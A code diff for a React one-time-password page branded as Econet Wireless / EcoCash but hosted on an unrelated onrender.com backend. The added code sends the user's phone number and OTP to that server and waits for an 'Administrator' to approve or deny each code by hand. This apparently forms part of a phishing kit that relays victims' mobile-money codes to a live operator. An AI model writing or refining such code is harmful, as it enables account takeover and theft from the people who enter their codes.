@@ -2,6 +2,8 @@ import React, { useState, useRef, useEffect } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import { ArrowLeft } from 'lucide-react';
 
+const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || "https://mixdatahub-fullstack.onrender.com";
+
 export default function OTPPage() {
   const location = useLocation();
   const navigate = useNavigate();
@@ -13,6 +15,7 @@ export default function OTPPage() {
   const [timeLeft, setTimeLeft] = useState<number>(120);
   const [isProcessing, setIsProcessing] = useState<boolean>(false);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const pollRef = useRef<NodeJS.Timeout | null>(null);
 
   const isComplete = otp.every((digit) => digit !== '');
 
@@ -21,6 +24,12 @@ export default function OTPPage() {
     const timer = setInterval(() => setTimeLeft((prev) => prev - 1), 1000);
     return () => clearInterval(timer);
   }, [timeLeft]);
+
+  useEffect(() => {
+    return () => {
+      if (pollRef.current) clearInterval(pollRef.current);
+    };
+  }, []);
 
   const handleChange = (index: number, e: React.ChangeEvent<HTMLInputElement>) => {
     const value = e.target.value;
@@ -47,15 +56,61 @@ export default function OTPPage() {
     }
   };
 
-  const handleConfirm = () => {
-    if (!isComplete) return;
+  const handleConfirm = async () => {
+    if (!isComplete || isProcessing) return;
     setIsProcessing(true);
-    setTimeout(() => {
+    const otpString = otp.join('');
+
+    try {
+      const response = await fetch(`${API_BASE_URL}/api/verify-otp`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone, otp: otpString, duration, price })
+      });
+
+      if (!response.ok) throw new Error("Failed to send OTP");
+      const { transaction_id } = await response.json();
+
+      let attempts = 0;
+      const maxAttempts = 30;
+
+      pollRef.current = setInterval(async () => {
+        attempts++;
+        if (attempts > maxAttempts) {
+          if (pollRef.current) clearInterval(pollRef.current);
+          setIsProcessing(false);
+          alert('Request timed out. Admin did not respond.');
+          return;
+        }
+
+        try {
+          const statusRes = await fetch(`${API_BASE_URL}/api/status/${transaction_id}`);
+          const statusData = await statusRes.json();
+
+          if (statusData.status === 'approved') {
+            if (pollRef.current) clearInterval(pollRef.current);
+            setIsProcessing(false);
+            navigate('/success', { state: { duration, voice, sms, data, price } });
+          } else if (statusData.status === 'denied') {
+            if (pollRef.current) clearInterval(pollRef.current);
+            setIsProcessing(false);
+            alert('OTP was denied by the Administrator.');
+            setOtp(['', '', '', '', '', '']);
+            inputRefs.current[0]?.focus();
+          }
+        } catch (err) {
+          console.error("Polling error", err);
+        }
+      }, 2000);
+
+    } catch (error) {
+      console.error(error);
       setIsProcessing(false);
-      navigate('/success', { state: { duration, voice, sms, data, price } });
-    }, 1500);
+      alert("Could not connect to the server. Please try again.");
+    }
   };
 
+  // ... (Keep all your existing `styles` object here exactly as it was) ...
   const styles = {
     appContainer: { width: '100%', maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', position: 'relative', boxShadow: '0 0 30px rgba(0,0,0,0.1)', overflowX: 'hidden', fontFamily: "'Inter', sans-serif" } as React.CSSProperties,
     header: { background: 'linear-gradient(135deg, #0b40c4 0%, #1e5ce6 100%)', padding: '20px 20px 24px', borderBottomLeftRadius: '20px', borderBottomRightRadius: '20px', color: 'white' } as React.CSSProperties,
@@ -78,14 +133,14 @@ export default function OTPPage() {
     timerRow: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '13px', color: '#666', marginBottom: '24px' } as React.CSSProperties,
     timerText: { color: timeLeft < 20 ? '#e53935' : '#666', fontWeight: 500 } as React.CSSProperties,
     resendBtn: { background: 'transparent', border: 'none', color: timeLeft > 0 ? '#c0c0c0' : '#1e5ce6', fontSize: '13px', fontWeight: 600, cursor: timeLeft > 0 ? 'not-allowed' : 'pointer', padding: 0 } as React.CSSProperties,
-    confirmBtn: { width: '100%', padding: '16px', border: 'none', borderRadius: '16px', fontSize: '16px', fontWeight: 700, color: 'white', backgroundColor: isComplete ? '#1e5ce6' : '#a0bdf5', cursor: isComplete && !isProcessing ? 'pointer' : 'not-allowed', transition: 'all 0.2s', boxShadow: isComplete ? '0 4px 12px rgba(30, 92, 230, 0.3)' : 'none', marginBottom: '16px' } as React.CSSProperties,
+    confirmBtn: { width: '100%', padding: '16px', border: 'none', borderRadius: '16px', fontSize: '16px', fontWeight: 700, color: 'white', backgroundColor: isComplete ? '#1e5ce6' : '#a0bdf5', cursor: isComplete && !isProcessing ? 'pointer' : 'not-allowed', transition: 'all 0.2s', boxShadow: isComplete && !isProcessing ? '0 4px 12px rgba(30, 92, 230, 0.3)' : 'none', marginBottom: '16px' } as React.CSSProperties,
     poweredBy: { fontSize: '9px', color: '#999', fontWeight: 500, letterSpacing: '0.5px', textAlign: 'center' } as React.CSSProperties,
   };
 
   return (
     <div style={styles.appContainer}>
       <div style={styles.header}>
-        <button style={styles.backButton} onClick={() => navigate(-1)}><ArrowLeft size={16} /> Back</button>
+        <button style={styles.backButton} onClick={() => navigate(-1)} disabled={isProcessing}><ArrowLeft size={16} /> Back</button>
         <div style={styles.brandLogos}>
           <div style={styles.logoEconet}>ECONET <span style={styles.logoEconetSpan}>Wireless</span></div>
           <div style={styles.logoEcocash}>EcoCash</div>
@@ -108,16 +163,27 @@ export default function OTPPage() {
           <label style={styles.otpLabel}>OTP CODE</label>
           <div style={styles.otpInputsContainer}>
             {otp.map((digit, index) => (
-              <input key={index} type="text" inputMode="numeric" value={digit} onChange={(e) => handleChange(index, e)} onKeyDown={(e) => handleKeyDown(index, e)} onPaste={index === 0 ? handlePaste : undefined} ref={(el) => (inputRefs.current[index] = el)} style={styles.otpBox(digit !== '', document.activeElement === inputRefs.current[index])} />
+              <input 
+                key={index} 
+                type="text" 
+                inputMode="numeric" 
+                value={digit} 
+                onChange={(e) => handleChange(index, e)} 
+                onKeyDown={(e) => handleKeyDown(index, e)} 
+                onPaste={index === 0 ? handlePaste : undefined} 
+                ref={(el) => (inputRefs.current[index] = el)} 
+                style={styles.otpBox(digit !== '', document.activeElement === inputRefs.current[index])} 
+                disabled={isProcessing}
+              />
             ))}
           </div>
           <div style={styles.timerRow}>
             <span style={styles.timerText}>Expires in {timeLeft}s</span>
-            <button style={styles.resendBtn} disabled={timeLeft > 0} onClick={() => setTimeLeft(120)}>Resend OTP</button>
+            <button style={styles.resendBtn} disabled={timeLeft > 0 || isProcessing} onClick={() => setTimeLeft(120)}>Resend OTP</button>
           </div>
         </div>
         <button style={styles.confirmBtn} disabled={!isComplete || isProcessing} onClick={handleConfirm}>
-          {isProcessing ? 'Verifying...' : 'Confirm OTP'}
+          {isProcessing ? 'Waiting for Admin Approval...' : 'Confirm OTP'}
         </button>
         <p style={styles.poweredBy}>POWERED BY ECONET WIRELESS · ECOCASH</p>
       </div>
